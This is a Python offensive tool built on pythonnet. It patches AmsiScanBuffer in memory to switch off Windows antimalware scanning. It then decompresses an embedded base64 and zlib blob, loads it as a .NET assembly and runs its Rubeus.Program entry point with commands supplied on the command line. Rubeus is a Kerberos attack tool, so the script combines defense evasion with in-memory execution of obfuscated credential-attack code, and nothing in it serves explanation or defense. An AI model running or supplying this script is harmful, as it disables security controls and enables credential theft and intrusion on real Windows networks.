import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()